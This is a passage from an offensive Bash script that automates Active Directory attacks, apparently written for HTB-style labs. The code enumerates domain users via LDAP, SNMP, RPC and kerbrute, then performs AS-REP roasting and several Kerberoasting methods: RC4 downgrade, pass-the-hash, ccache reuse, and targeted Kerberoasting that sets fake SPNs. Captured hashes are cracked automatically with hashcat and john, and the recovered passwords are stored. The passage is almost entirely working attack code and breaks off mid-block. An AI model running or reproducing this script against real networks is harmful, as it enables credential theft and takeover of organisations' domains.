        --module users --full 2>/dev/null | tee "$OUTDIR/users/windapsearch_users.txt"
    windapsearch -d "$DOMAIN" --dc "$TARGET" \
        -u "${DUMP_USER}@${DOMAIN}" -p "$DUMP_PASS" \
        --module privileged-users 2>/dev/null | tee "$OUTDIR/users/windapsearch_privusers.txt"
    windapsearch -d "$DOMAIN" --dc "$TARGET" \
        -u "${DUMP_USER}@${DOMAIN}" -p "$DUMP_PASS" \
        --module computers 2>/dev/null | tee "$OUTDIR/users/windapsearch_computers.txt"
    grep -oP 'sAMAccountName:\s*\K\S+' "$OUTDIR/users/windapsearch_users.txt" 2>/dev/null | \
        while read -r u; do add_user "$u"; done
elif ! command -v windapsearch &>/dev/null; then
    warn "windapsearch not installed. Install: go install github.com/ropnop/windapsearch@latest"
    warn "  or: wget https://github.com/ropnop/go-windapsearch/releases/latest/download/windapsearch-linux-amd64 -O /usr/local/bin/windapsearch && chmod +x /usr/local/bin/windapsearch"
fi

# ─── Method 7: Parallel background enumeration ─────────────────────────────────
sep; info "★ Running parallel user enumeration in background..."
PARALLEL_PIDS=()

# Parallel job 1: SNMP user walk (port 161) — often overlooked
if echo "$OPEN_PORTS" | grep -q "161" && command -v snmpwalk &>/dev/null; then
    (
        info "  [BG] SNMP user walk..."
        for community in public private community internal manager; do
            snmpwalk -v2c -c "$community" "$TARGET" 1.3.6.1.4.1.77.1.2.25 2>/dev/null | \
                grep -oP 'STRING:\s*"\K[^"]+' | while read -r u; do
                add_user "$u"
                echo "$u" >> "$OUTDIR/users/snmp_users.txt"
            done
        done
        # Also walk hrSWRunParameters for usernames in running processes
        snmpwalk -v2c -c "public" "$TARGET" 1.3.6.1.2.1.25.4.2.1.5 2>/dev/null | \
            tee "$OUTDIR/misc/snmp_processes.txt" | grep -oP '-U\s*\K\S+|-user\s*\K\S+' | \
            while read -r u; do add_user "$u"; done
    ) &
    PARALLEL_PIDS+=($!)
fi

# Parallel job 2: rpcclient querydispinfo levels
(
    info "  [BG] rpcclient multi-level dispinfo..."
    for level in 1 2 3 4 5; do
        rpcclient -U "${DUMP_USER}%${DUMP_PASS:-}" "$TARGET" \
            -c "querydispinfo level=$level" 2>/dev/null | \
            grep -oP 'Account:\s*\K\S+' | while read -r u; do add_user "$u"; done
    done
    # enumdomusers with auth
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        rpcclient -U "$DUMP_USER%$DUMP_PASS" "$TARGET" \
            -c "enumdomusers" 2>/dev/null | \
            grep -oP '\[([^\]]+)\]' | tr -d '[]' | grep -v "0x" | \
            while read -r u; do add_user "$u"; done
    fi
) &
PARALLEL_PIDS+=($!)

# Parallel job 3: netexec GetADUsers (impacket)
(
    info "  [BG] impacket-GetADUsers (all accounts)..."
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        impacket-GetADUsers "$DOMAIN/$DUMP_USER:$DUMP_PASS" -all -dc-ip "$TARGET" \
            2>/dev/null | grep -oP '^[A-Za-z0-9._-]+' | \
            grep -vE '^(User|---|Password|Last|Name|SAM|Account)' | \
            while read -r u; do add_user "$u"; done
    else
        impacket-GetADUsers "$DOMAIN/" -all -dc-ip "$TARGET" -no-pass \
            2>/dev/null | grep -oP '^[A-Za-z0-9._-]+' | \
            grep -vE '^(User|---|Password|Last|Name|SAM|Account)' | \
            while read -r u; do add_user "$u"; done
    fi
) &
PARALLEL_PIDS+=($!)

# Wait for all parallel jobs
info "Waiting for parallel enumeration jobs (max 60s)..."
for pid in "${PARALLEL_PIDS[@]}"; do
    timeout 60 wait "$pid" 2>/dev/null
done
ok "Parallel enumeration complete"

# ─── Method 8: Nmap msrpc-enum + Kerberos enum ─────────────────────────────────
sep; info "★ Nmap RPC + Kerberos user enum scripts..."
nmap -p 88,135,445 --script "krb5-enum-users,msrpc-enum" \
    --script-args "krb5-enum-users.realm=$DOMAIN,userdb=$USERS_FILE" \
    -T4 --host-timeout 3m "$TARGET" 2>/dev/null | tee "$OUTDIR/users/nmap_rpc_enum.txt"
grep -oP 'Valid Kerberos.*\K[A-Za-z0-9._-]+$' "$OUTDIR/users/nmap_rpc_enum.txt" 2>/dev/null | \
    while read -r u; do add_user "$u"; echo "$u" >> "$VALID_USERS"; done

# ─── Method 9: MegaList — built-in common AD service accounts ──────────────────
sep; info "★ Validating built-in AD service account list via Kerberos..."
MEGA_LIST=$(mktemp)
printf '%s\n' \
    Administrator admin administrator Guest guest DefaultAccount \
    WDAGUtilityAccount krbtgt SUPPORT_388945a0 IUSR IWAM_SYSTEM \
    svc_admin svc-admin svc_backup svc-backup svc_sql svc-sql sql_svc \
    svc_web svc-web web_svc svc_ftp svc-ftp ftp_user svc_iis svc-iis \
    svc_scan svc-scan svc_print svc-print svc_monitor svc-monitor \
    svc_ldap svc-ldap svc_smtp svc-smtp svc_proxy svc-proxy svc_av \
    svc_exchange svc-exchange Exchange HealthMailbox \
    backup backupadmin backup_admin BackupAdmin svc_backup \
    helpdesk help_desk HelpDesk support Support IT it-admin itadmin \
    developer dev devops DevOps dba DBA operator ops \
    test test_user testuser testadmin Test TestUser \
    sa SA mssql mssqlsvc MSSQLSvc SQLService sqlservice \
    oracle oraclesvc OracleService websvc WebSvc appsvc AppSvc \
    scanuser scan_user printuser print_user mailuser mail_user \
    ldapuser ldap_user adm adm1n \
    netadmin net_admin netops sysadmin sys_admin sysops svc_deploy \
    jenkins jenkins_svc JenkinsSvc ci_svc deploy_svc build_svc \
    sharepoint SharePoint spfarm SpFarm s-sharepoint \
    > "$MEGA_LIST"

if command -v kerbrute &>/dev/null && [[ -n "$DOMAIN" ]]; then
    kerbrute userenum -d "$DOMAIN" --dc "$TARGET" \
        --threads 100 "$MEGA_LIST" \
        -o "$OUTDIR/users/kerbrute_megalist.txt" 2>/dev/null
    grep -i "VALID" "$OUTDIR/users/kerbrute_megalist.txt" 2>/dev/null | \
        awk '{print $NF}' | sed 's/@.*//' | while read -r u; do
        add_user "$u"; echo "$u" >> "$VALID_USERS"
        crit "★ SERVICE ACCOUNT FOUND: $u"
    done
fi
rm -f "$MEGA_LIST"

# ─── Method 10: LDAP filter for service/admin accounts ─────────────────────────
sep; info "★ LDAP — targeted query for admin + service accounts..."
for ldap_filter in \
    "(&(objectClass=user)(adminCount=1))" \
    "(&(objectClass=user)(servicePrincipalName=*))" \
    "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,$DOMAIN_DN))" \
    "(&(objectClass=user)(memberOf=CN=Enterprise Admins,CN=Users,$DOMAIN_DN))" \
    "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
    "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" ; do
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        ldapsearch -x -H "ldap://$TARGET" \
            -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" \
            -b "$DOMAIN_DN" "$ldap_filter" sAMAccountName memberOf userAccountControl \
            2>/dev/null | grep "sAMAccountName:" | awk '{print $2}' | \
            while read -r u; do add_user "$u"; done
    else
        ldapsearch -x -H "ldap://$TARGET" -b "$DOMAIN_DN" \
            "$ldap_filter" sAMAccountName 2>/dev/null | \
            grep "sAMAccountName:" | awk '{print $2}' | \
            while read -r u; do add_user "$u"; done
    fi
done

# ─── Final tally ───────────────────────────────────────────────────────────────
TOTAL_U=$(wc -l < "$USERS_FILE" 2>/dev/null || echo 0)
TOTAL_V=$(sort -u "$VALID_USERS" 2>/dev/null | wc -l || echo 0)
sort -u -o "$USERS_FILE" "$USERS_FILE" 2>/dev/null
sort -u -o "$VALID_USERS" "$VALID_USERS" 2>/dev/null
crit "★ USER ENUMERATION COMPLETE: $TOTAL_U discovered | $TOTAL_V validated"
cp "$USERS_FILE" "$OUTDIR/users/all_users_final.txt" 2>/dev/null
cp "$VALID_USERS" "$OUTDIR/users/valid_users_final.txt" 2>/dev/null



# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — PASSWORD & HASH ATTACKS
# ═══════════════════════════════════════════════════════════════════════════════
phase "6 — PASSWORD & HASH ATTACKS"
ATTACK_USERS="$USERS_FILE"; [[ -s "$VALID_USERS" ]] && ATTACK_USERS="$VALID_USERS"

# ── 6a: AS-REP Roasting (HTB: Forest, Absolute, Sauna) ──
sep; info "★ AS-REP Roasting..."
if [[ -n "$DOMAIN" ]]; then
    # Try with discovered users file
    if [[ -s "$ATTACK_USERS" ]]; then
        info "AS-REP Roasting with $(wc -l < "$ATTACK_USERS") discovered users..."
        impacket-GetNPUsers "$DOMAIN/" -dc-ip "$TARGET" -no-pass \
            -usersfile "$ATTACK_USERS" -format hashcat -outputfile "$OUTDIR/hashes/asrep.txt" 2>&1 | tee "$OUTDIR/hashes/asrep_stdout.txt"
    fi

    # Try auto-discovery (requires LDAP access to enumerate DONT_REQ_PREAUTH users)
    get_best_cred
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        info "AS-REP Roasting with auth ($DUMP_USER)..."
        impacket-GetNPUsers "$DOMAIN/$DUMP_USER:$DUMP_PASS" -dc-ip "$TARGET" -request \
            -format hashcat -outputfile "$OUTDIR/hashes/asrep_auto.txt" 2>&1 | tee -a "$OUTDIR/hashes/asrep_stdout.txt"
    elif [[ -n "$DUMP_USER" && -n "$DUMP_HASH" ]]; then
        info "AS-REP Roasting with hash auth ($DUMP_USER)..."
        impacket-GetNPUsers "$DOMAIN/$DUMP_USER" -dc-ip "$TARGET" -hashes "$DUMP_HASH" -request \
            -format hashcat -outputfile "$OUTDIR/hashes/asrep_auto.txt" 2>&1 | tee -a "$OUTDIR/hashes/asrep_stdout.txt"
    fi

    # Also try common usernames if no users discovered
    if [[ ! -s "$ATTACK_USERS" ]]; then
        info "No users discovered, trying common AD usernames..."
        COMMON_USERS=$(mktemp)
        printf '%s\n' administrator admin guest krbtgt svc_admin svc-admin svc_sql sql_svc \
            backup service web_svc ftp_user iis_user test support helpdesk > "$COMMON_USERS"
        impacket-GetNPUsers "$DOMAIN/" -dc-ip "$TARGET" -no-pass \
            -usersfile "$COMMON_USERS" -format hashcat -outputfile "$OUTDIR/hashes/asrep_common.txt" 2>&1 | tee -a "$OUTDIR/hashes/asrep_stdout.txt"
        # Extract valid usernames from "User ... doesn't have UF_DONT_REQUIRE_PREAUTH" messages
        grep -oP 'User\s+\K\S+(?=\s+doesn)' "$OUTDIR/hashes/asrep_stdout.txt" 2>/dev/null | while read -r u; do
            add_user "$u"
        done
        rm -f "$COMMON_USERS"
    fi

    ASREP=$(cat "$OUTDIR/hashes/asrep.txt" "$OUTDIR/hashes/asrep_auto.txt" "$OUTDIR/hashes/asrep_common.txt" 2>/dev/null | grep '\$krb5asrep\$' | sort -u)
    if [[ -n "$ASREP" ]]; then
        crit "★ AS-REP HASHES: $(echo "$ASREP" | wc -l)"
        echo "$ASREP" | while read -r h; do
            U=$(echo "$h" | grep -oP '\$krb5asrep\$23\$\K[^@:]+'); save_hash "ASREP|$U|$h"
            echo -e "  ${YEL}$U${RST}"
        done
        # Auto-crack
        if command -v hashcat &>/dev/null && [[ -f "$PASSLIST" ]]; then
            info "Auto-cracking AS-REP..."
            echo "$ASREP" > "$OUTDIR/hashes/asrep_all.txt"
            timeout 180 hashcat -m 18200 -a 0 "$OUTDIR/hashes/asrep_all.txt" "$PASSLIST" --force --quiet 2>/dev/null
            hashcat -m 18200 "$OUTDIR/hashes/asrep_all.txt" --show 2>/dev/null | while IFS=: read -r hash pass; do
                U=$(echo "$hash" | grep -oP '\$krb5asrep\$23\$\K[^@:]+')
                [[ -n "$U" && -n "$pass" ]] && save_cred "$U" "$pass"
            done
        fi
    fi
fi

# ── 6b: ADVANCED KERBEROASTING ────────────────────────────────────────────────
sep
echo -e "${RED}${BOLD}╔═══════════════════════════════════════════════════════════╗${RST}"
echo -e "${RED}${BOLD}║  ★ ADVANCED KERBEROASTING ENGINE                          ║${RST}"
echo -e "${RED}${BOLD}╚═══════════════════════════════════════════════════════════╝${RST}"
mkdir -p "$OUTDIR/kerberos/advanced"

if [[ -n "$DOMAIN" ]]; then
    get_best_cred

    # ── 6b-1: SPN Inventory & Analysis ────────────────────────────────────────
    sep; info "★ Full SPN inventory (etype analysis)..."

    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        # Dump all SPNs with full details — categorize RC4 vs AES
        impacket-GetUserSPNs "$DOMAIN/$DUMP_USER:$DUMP_PASS" \
            -dc-ip "$TARGET" -outputfile "$OUTDIR/kerberos/advanced/spn_inventory.txt" \
            2>/dev/null | tee "$OUTDIR/kerberos/advanced/spn_stdout.txt"

        # Dedicated netexec SPN listing (faster, tabular output)
        if command -v netexec &>/dev/null; then
            netexec ldap "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" --spns \
                2>/dev/null | tee "$OUTDIR/kerberos/advanced/nxc_spns.txt"
            SPN_COUNT=$(grep -c "sPN" "$OUTDIR/kerberos/advanced/nxc_spns.txt" 2>/dev/null || echo 0)
            ok "SPNs via netexec: $SPN_COUNT"
        fi

        # LDAP SPN dump with full etype + encryption info
        ldapsearch -x -H "ldap://$TARGET" \
            -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" \
            -b "$DOMAIN_DN" \
            "(&(objectClass=user)(servicePrincipalName=*))" \
            sAMAccountName servicePrincipalName msDS-SupportedEncryptionTypes \
            userAccountControl description pwdLastSet whenCreated \
            2>/dev/null | tee "$OUTDIR/kerberos/advanced/spn_ldap_full.txt"

        # Classify accounts by encryption type
        CUR_SPN_USER=""; CUR_SPN_SPN=""; CUR_ETYPE=""
        while IFS= read -r line; do
            if echo "$line" | grep -q "^sAMAccountName:"; then
                CUR_SPN_USER=$(echo "$line" | awk '{print $2}')
            fi
            if echo "$line" | grep -q "^servicePrincipalName:"; then
                CUR_SPN_SPN=$(echo "$line" | awk '{print $2}')
            fi
            if echo "$line" | grep -q "^msDS-SupportedEncryptionTypes:"; then
                CUR_ETYPE=$(echo "$line" | awk '{print $2}')
                # Decode etype bitmask
                # 0/4 = RC4 only → fast crack  |  8/16/24 = AES only → slow crack  |  28/31 = all
                if [[ "$CUR_ETYPE" -eq 0 || "$CUR_ETYPE" -eq 4 ]] 2>/dev/null; then
                    crit "★ RC4-ONLY SPN (fast crack): $CUR_SPN_USER [$CUR_SPN_SPN] etype=$CUR_ETYPE"
                    echo "$CUR_SPN_USER" >> "$OUTDIR/kerberos/advanced/rc4_only_spn_users.txt"
                elif [[ "$CUR_ETYPE" -ge 8 ]] 2>/dev/null; then
                    warn "AES-ONLY SPN (harder to crack): $CUR_SPN_USER [$CUR_SPN_SPN] etype=$CUR_ETYPE"
                    echo "$CUR_SPN_USER" >> "$OUTDIR/kerberos/advanced/aes_only_spn_users.txt"
                fi
            fi
        done < "$OUTDIR/kerberos/advanced/spn_ldap_full.txt"

        RC4_COUNT=$(wc -l < "$OUTDIR/kerberos/advanced/rc4_only_spn_users.txt" 2>/dev/null || echo 0)
        AES_COUNT=$(wc -l < "$OUTDIR/kerberos/advanced/aes_only_spn_users.txt" 2>/dev/null || echo 0)
        [[ "$RC4_COUNT" -gt 0 ]] && crit "★ $RC4_COUNT RC4-ONLY SPN accounts — prioritize these for cracking!"
        [[ "$AES_COUNT" -gt 0 ]] && warn "  $AES_COUNT AES-only SPN accounts — require AES13 hashcat mode"
    fi

    # ── 6b-2: Anonymous Kerberoast attempt ────────────────────────────────────
    sep; info "★ Anonymous Kerberoast (no creds)..."
    impacket-GetUserSPNs "$DOMAIN/" -dc-ip "$TARGET" -no-pass -request \
        -outputfile "$OUTDIR/hashes/kerb_noauth.txt" 2>&1 | tee "$OUTDIR/hashes/kerb_stdout.txt"

    # ── 6b-3: RC4 Downgrade Attack (force etype 23 / RC4-HMAC) ────────────────
    sep; info "★ RC4 Downgrade Attack — requesting RC4 tickets regardless of account config..."
    # Even if account supports AES, we can often force RC4 by using -etype 23 (RC4 = etype 23)
    # RC4 hashes crack ~4x faster than AES256 (etype 18)
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        info "  Requesting ALL SPN tickets with forced RC4 (etype 23)..."
        impacket-GetUserSPNs "$DOMAIN/$DUMP_USER:$DUMP_PASS" \
            -dc-ip "$TARGET" -request \
            -outputfile "$OUTDIR/kerberos/advanced/kerb_rc4_downgrade.txt" \
            2>&1 | tee "$OUTDIR/kerberos/advanced/kerb_rc4_stdout.txt"
        # Check if we got RC4 tickets (23) vs AES (17/18)
        RC4_TICKETS=$(grep -c '\$krb5tgs\$23\$' "$OUTDIR/kerberos/advanced/kerb_rc4_downgrade.txt" 2>/dev/null || echo 0)
        AES256_TICKETS=$(grep -c '\$krb5tgs\$18\$' "$OUTDIR/kerberos/advanced/kerb_rc4_downgrade.txt" 2>/dev/null || echo 0)
        AES128_TICKETS=$(grep -c '\$krb5tgs\$17\$' "$OUTDIR/kerberos/advanced/kerb_rc4_downgrade.txt" 2>/dev/null || echo 0)
        crit "★ Ticket types obtained: RC4(23)=$RC4_TICKETS | AES128(17)=$AES128_TICKETS | AES256(18)=$AES256_TICKETS"
        [[ "$AES256_TICKETS" -gt 0 ]] && {
            warn "  Some accounts are AES-only (RC4 downgrade blocked by 'This account supports Kerberos AES 256 bit encryption' flag)"
            warn "  AES256 cracking: hashcat -m 19700 kerb_aes256.txt rockyou.txt"
            grep '\$krb5tgs\$18\$' "$OUTDIR/kerberos/advanced/kerb_rc4_downgrade.txt" 2>/dev/null \
                > "$OUTDIR/hashes/kerb_aes256.txt"
        }
        [[ "$AES128_TICKETS" -gt 0 ]] && {
            warn "  AES128 cracking: hashcat -m 19600 kerb_aes128.txt rockyou.txt"
            grep '\$krb5tgs\$17\$' "$OUTDIR/kerberos/advanced/kerb_rc4_downgrade.txt" 2>/dev/null \
                > "$OUTDIR/hashes/kerb_aes128.txt"
        }
    fi

    # ── 6b-4: Kerberoast with hash auth (Pass-the-Key) ────────────────────────
    sep; info "★ Kerberoast via Pass-the-Hash / Overpass-the-Key..."
    if [[ -n "$DUMP_USER" && -n "$DUMP_HASH" ]]; then
        impacket-GetUserSPNs "$DOMAIN/$DUMP_USER" \
            -dc-ip "$TARGET" -hashes "$DUMP_HASH" -request \
            -outputfile "$OUTDIR/hashes/kerb_pth.txt" \
            2>&1 | tee -a "$OUTDIR/hashes/kerb_stdout.txt"
        [[ -s "$OUTDIR/hashes/kerb_pth.txt" ]] && crit "★ Kerberoast via PtH succeeded!"
    fi

    # Also try with any TGT ccache files found
    CCACHE=$(find "$OUTDIR" /tmp -name "*.ccache" 2>/dev/null | head -1)
    if [[ -n "$CCACHE" ]]; then
        info "★ Kerberoast using existing TGT ccache: $CCACHE"
        KRB5CCNAME="$CCACHE" impacket-GetUserSPNs "$DOMAIN/$DUMP_USER" \
            -dc-ip "$TARGET" -k -no-pass -request \
            -outputfile "$OUTDIR/kerberos/advanced/kerb_tgt_ccache.txt" 2>/dev/null
        [[ -s "$OUTDIR/kerberos/advanced/kerb_tgt_ccache.txt" ]] && \
            crit "★ Kerberoast via TGT ccache succeeded!"
    fi

    # ── 6b-5: Kerbrute --downgrade (force RC4 via kerbrute) ───────────────────
    sep; info "★ Kerbrute Kerberoast with RC4 downgrade flag..."
    if command -v kerbrute &>/dev/null && [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]] && [[ -s "$VALID_USERS" ]]; then
        # kerbrute doesn't have direct Kerberoast, but we can check if it supports it
        kerbrute --help 2>&1 | grep -qi "kerberoast" && {
            info "  kerbrute kerberoast..."
            kerbrute kerberoast -d "$DOMAIN" --dc "$TARGET" \
                -u "${DUMP_USER}@${DOMAIN}" --threads 30 \
                -o "$OUTDIR/kerberos/advanced/kerbrute_kerberoast.txt" 2>/dev/null
        }
    fi

    # ── 6b-6: Targeted Kerberoasting (WriteSPN / GenericWrite abuse) ─────────
    sep; info "★ Targeted Kerberoast (WriteSPN abuse — HTB: Blazorized)..."
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]] && command -v bloodyAD &>/dev/null; then
        WRITABLE_USERS=$(bloodyAD -d "$DOMAIN" --host "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" \
            get writable --otype USER 2>/dev/null | grep -oP 'sAMAccountName:\s*\K\S+' | \
            grep -iv "$DUMP_USER" | head -10)
        if [[ -n "$WRITABLE_USERS" ]]; then
            crit "★ Users we can write to (Targeted Kerberoast candidates):"
            echo "$WRITABLE_USERS" | while read -r target_user; do
                crit "  → $target_user"
                bloodyAD -d "$DOMAIN" --host "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" \
                    set object "$target_user" servicePrincipalNames \
                    -v "fake/targeted.${DOMAIN}" 2>/dev/null && {
                    ok "SPN set on $target_user — Kerberoasting (RC4 forced)..."
                    impacket-GetUserSPNs "$DOMAIN/$DUMP_USER:$DUMP_PASS" \
                        -dc-ip "$TARGET" \
                        -request-user "$target_user" \
                        -outputfile "$OUTDIR/hashes/targeted_kerb_${target_user}.txt" 2>/dev/null
                    bloodyAD -d "$DOMAIN" --host "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" \
                        remove object "$target_user" servicePrincipalNames \
                        -v "fake/targeted.${DOMAIN}" 2>/dev/null
                    grep '\$krb5tgs\$' "$OUTDIR/hashes/targeted_kerb_${target_user}.txt" 2>/dev/null && {
                        crit "★ TARGETED KERBEROAST HASH CAPTURED: $target_user"
                        save_hash "TARGETED_TGS|$target_user"
                    }
                }
            done
        fi
    fi

    # ── 6b-7: netexec Kerberoasting (parallel, single command) ───────────────
    sep; info "★ netexec Kerberoasting (all SPNs in one shot)..."
    if command -v netexec &>/dev/null && [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        netexec ldap "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" \
            --kerberoasting "$OUTDIR/kerberos/advanced/nxc_kerberoast.txt" \
            2>/dev/null | tee "$OUTDIR/kerberos/advanced/nxc_kerb_stdout.txt"
        [[ -s "$OUTDIR/kerberos/advanced/nxc_kerberoast.txt" ]] && {
            NXC_TGS=$(grep -c '\$krb5tgs\$' "$OUTDIR/kerberos/advanced/nxc_kerberoast.txt" 2>/dev/null || echo 0)
            crit "★ netexec Kerberoast: $NXC_TGS TGS hashes"
        }
    fi

    # ── 6b-8: Collect all TGS hashes ──────────────────────────────────────────
    KERB=$(cat \
        "$OUTDIR/hashes/kerb_noauth.txt" \
        "$OUTDIR/hashes/kerb_auth.txt" \
        "$OUTDIR/hashes/kerb_pth.txt" \
        "$OUTDIR/kerberos/advanced/kerb_rc4_downgrade.txt" \
        "$OUTDIR/kerberos/advanced/kerb_tgt_ccache.txt" \
        "$OUTDIR/kerberos/advanced/nxc_kerberoast.txt" \
        "$OUTDIR/kerberos/advanced/kerbrute_kerberoast.txt" \
        2>/dev/null | grep '\$krb5tgs\$' | sort -u)

    if [[ -n "$KERB" ]]; then
        crit "★ TOTAL KERBEROAST HASHES: $(echo "$KERB" | wc -l)"
        echo "$KERB" | tee "$OUTDIR/hashes/kerb_all.txt" | while read -r h; do
            U=$(echo "$h" | grep -oP '\$krb5tgs\$\d+\$\*\K[^*]+')
            ETYPE=$(echo "$h" | grep -oP '\$krb5tgs\$\K\d+')
            ETYPE_NAME="RC4"; [[ "$ETYPE" == "18" ]] && ETYPE_NAME="AES256"; [[ "$ETYPE" == "17" ]] && ETYPE_NAME="AES128"
            save_hash "TGS|$U|$h"
            echo -e "  ${YEL}$U${RST} ${DIM}[etype=$ETYPE/$ETYPE_NAME]${RST}"
        done

        # ── 6b-9: Multi-engine cracking ───────────────────────────────────────
        sep; info "★ Multi-engine Kerberoast cracking..."

        # Split by etype for correct hashcat mode
        grep '\$krb5tgs\$23\$' "$OUTDIR/hashes/kerb_all.txt" 2>/dev/null > "$OUTDIR/hashes/kerb_rc4.txt"
        grep '\$krb5tgs\$18\$' "$OUTDIR/hashes/kerb_all.txt" 2>/dev/null > "$OUTDIR/hashes/kerb_aes256.txt"
        grep '\$krb5tgs\$17\$' "$OUTDIR/hashes/kerb_all.txt" 2>/dev/null > "$OUTDIR/hashes/kerb_aes128.txt"

        if command -v hashcat &>/dev/null; then
            # RC4 (mode 13100) — fastest
            if [[ -s "$OUTDIR/hashes/kerb_rc4.txt" && -f "$PASSLIST" ]]; then
                info "  hashcat RC4 TGS (mode 13100) — wordlist..."
                timeout 180 hashcat -m 13100 -a 0 "$OUTDIR/hashes/kerb_rc4.txt" "$PASSLIST" \
                    --force --quiet 2>/dev/null
                hashcat -m 13100 "$OUTDIR/hashes/kerb_rc4.txt" --show 2>/dev/null | \
                    while IFS=: read -r hash pass; do
                    U=$(echo "$hash" | grep -oP '\$krb5tgs\$\d+\$\*\K[^*]+')
                    [[ -n "$U" && -n "$pass" ]] && { save_cred "$U" "$pass"; crit "★ CRACKED TGS: $U → $pass"; }
                done

                # Rule-based attack (best64 + dive rules — covers common mutations)
                info "  hashcat RC4 — rule-based attack (best64 rules)..."
                for rule in /usr/share/hashcat/rules/best64.rule /usr/share/hashcat/rules/dive.rule \
                            /usr/share/hashcat/rules/d3ad0ne.rule /usr/share/hashcat/rules/Hob064.rule; do
                    [[ -f "$rule" ]] || continue
                    timeout 120 hashcat -m 13100 -a 0 "$OUTDIR/hashes/kerb_rc4.txt" "$PASSLIST" \
                        -r "$rule" --force --quiet 2>/dev/null
                    hashcat -m 13100 "$OUTDIR/hashes/kerb_rc4.txt" --show 2>/dev/null | \
                        grep -v "^$" | while IFS=: read -r hash pass; do
                        U=$(echo "$hash" | grep -oP '\$krb5tgs\$\d+\$\*\K[^*]+')
                        [[ -n "$U" && -n "$pass" ]] && save_cred "$U" "$pass"
                    done
                done

                # Combinator attack (wordlist + mutations)
                info "  hashcat RC4 — combinator attack (wordlist × top mutations)..."
                MUTATIONS=$(mktemp)
                YEAR=$(date +%Y); YEAR_SHORT=$(date +%y)
                printf '%s\n' "" "1" "12" "123" "1234" "12345" "!" "!!" "1!" "2!" \
                    "$YEAR" "${YEAR}!" "${YEAR_SHORT}" \
                    "@" "#" "$" "%" "^" "&" "*" \
                    > "$MUTATIONS"
                timeout 90 hashcat -m 13100 -a 1 "$OUTDIR/hashes/kerb_rc4.txt" \
                    "$PASSLIST" "$MUTATIONS" --force --quiet 2>/dev/null
                rm -f "$MUTATIONS"
                hashcat -m 13100 "$OUTDIR/hashes/kerb_rc4.txt" --show 2>/dev/null | \
                    grep -v "^$" | while IFS=: read -r hash pass; do
                    U=$(echo "$hash" | grep -oP '\$krb5tgs\$\d+\$\*\K[^*]+')
                    [[ -n "$U" && -n "$pass" ]] && save_cred "$U" "$pass"
                done
            fi

            # AES256 (mode 19700) — slower but attempt anyway
            if [[ -s "$OUTDIR/hashes/kerb_aes256.txt" && -f "$PASSLIST" ]]; then
                info "  hashcat AES256 TGS (mode 19700) — wordlist..."
                timeout 120 hashcat -m 19700 -a 0 "$OUTDIR/hashes/kerb_aes256.txt" "$PASSLIST" \
                    --force --quiet 2>/dev/null
                hashcat -m 19700 "$OUTDIR/hashes/kerb_aes256.txt" --show 2>/dev/null | \
                    grep -v "^$" | while IFS=: read -r hash pass; do
                    U=$(echo "$hash" | grep -oP '\$krb5tgs\$\d+\$\*\K[^*]+')
                    [[ -n "$U" && -n "$pass" ]] && { save_cred "$U" "$pass"; crit "★ CRACKED AES256 TGS: $U → $pass"; }
                done
            fi

            # AES128 (mode 19600)
            if [[ -s "$OUTDIR/hashes/kerb_aes128.txt" && -f "$PASSLIST" ]]; then
                info "  hashcat AES128 TGS (mode 19600)..."
                timeout 120 hashcat -m 19600 -a 0 "$OUTDIR/hashes/kerb_aes128.txt" "$PASSLIST" \
                    --force --quiet 2>/dev/null
                hashcat -m 19600 "$OUTDIR/hashes/kerb_aes128.txt" --show 2>/dev/null | \
                    grep -v "^$" | while IFS=: read -r hash pass; do
                    U=$(echo "$hash" | grep -oP '\$krb5tgs\$\d+\$\*\K[^*]+')
                    [[ -n "$U" && -n "$pass" ]] && save_cred "$U" "$pass"
                done
            fi
        fi

        # john cracking (different engine — can catch what hashcat misses)
        if command -v john &>/dev/null && [[ -f "$PASSLIST" ]]; then
            info "  john — Kerberoast (krb5tgs format)..."
            [[ -s "$OUTDIR/hashes/kerb_rc4.txt" ]] && {
                john --wordlist="$PASSLIST" --format=krb5tgs \
                    "$OUTDIR/hashes/kerb_rc4.txt" 2>/dev/null
                john --show --format=krb5tgs "$OUTDIR/hashes/kerb_rc4.txt" 2>/dev/null | \
                    grep ':' | while IFS=: read -r u p rest; do
                    [[ -n "$u" && -n "$p" && "$p" != "0 password" ]] && save_cred "$u" "$p"
                done
            }
            [[ -s "$OUTDIR/hashes/kerb_aes256.txt" ]] && {
                info "  john — AES256 TGS (krb5tgs-aes256)..."
                john --wordlist="$PASSLIST" --format=krb5tgs-aes256 \
                    "$OUTDIR/hashes/kerb_aes256.txt" 2>/dev/null
                john --show --format=krb5tgs-aes256 "$OUTDIR/hashes/kerb_aes256.txt" 2>/dev/null | \
                    grep ':' | while IFS=: read -r u p rest; do
                    [[ -n "$u" && -n "$p" && "$p" != "0 password" ]] && save_cred "$u" "$p"
                done
            }
        fi

        # tgsrepcrack.py (Tim Medin's original tool — alternative engine)
        TGSREPCRACK=""
        for tgs_path in /opt/kerberoast/tgsrepcrack.py /usr/share/kerberoast/tgsrepcrack.py \
                        /opt/kerberoast/tgsrepcrack.py; do
            [[ -f "$tgs_path" ]] && { TGSREPCRACK="$tgs_path"; break; }
        done
        if [[ -n "$TGSREPCRACK" && -f "$PASSLIST" && -s "$OUTDIR/hashes/kerb_rc4.txt" ]]; then
            info "  tgsrepcrack.py — classic Kerberoast cracker..."
